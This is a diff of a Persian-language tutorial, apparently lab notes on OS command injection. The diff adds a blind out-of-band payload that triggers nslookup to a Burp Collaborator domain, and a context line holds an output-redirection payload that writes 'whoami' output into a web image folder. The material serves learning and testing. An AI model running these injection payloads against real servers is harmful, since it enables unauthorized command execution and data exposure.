@@ -25,8 +25,8 @@
 - Output redirection : ```||whoami>/var/www/images/output.txt||```
 <p align="right">عکس ها در مسیر فوق ذخیره شده اند، در این حالت، خروجی دستور در مسیر share شده ذخیره می گردد و بعدا می توانیم یکی از عکس های محصولات را باز کرده، سپس نام  فایل را با نام output.txt تغییر دهیم، تا نتیجه دستور را مشاهده کنیم</p>
 
-- Out-of-band interaction : ``````
-<p align="right">در اینحالت سرور به </p>
+- Out-of-band interaction : ```x||nslookup+7goyqnfizle0fk6mj5zk5qjtrkxalz.burpcollaborator.net```
+<p align="right">در اینحالت سرور می تواند به یک آدرس بیرونی وصل شود، برای بررسی از Burp Collaborator استفاده می کنیم </p>
 
 - Out-of-band data exfilteration : ``````
 
